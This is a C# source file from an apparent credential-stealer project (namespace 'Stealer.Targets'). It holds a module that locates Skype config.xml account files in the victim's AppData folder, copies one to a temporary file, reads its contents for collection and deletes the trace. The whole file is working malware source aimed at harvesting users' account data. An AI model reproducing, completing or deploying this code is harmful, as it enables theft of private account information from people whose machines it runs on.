using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Stealer.Targets
{
    class Skype : AbstractFile
    {
        private string _path = null;
        private string[] _skypeAccounts = null;

        public override bool IsExist()
        {
            string userNamePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            _path = string.Format(@"{0}\Skype\", userNamePath);
            _skypeAccounts = Directory.GetFiles(_path, "config.xml", SearchOption.AllDirectories);
            return _skypeAccounts.Length > 0;
        }

        public override byte[] GetFile()
        {
            string pathCopy = Path.GetTempPath() + Path.GetRandomFileName();
            File.Copy(_skypeAccounts[0], pathCopy);
            byte[] data = File.ReadAllBytes(pathCopy);
            File.Delete(pathCopy);
            return data;
        }

        public override string ToString()
        {
            return "Skype";
        }
    }
}
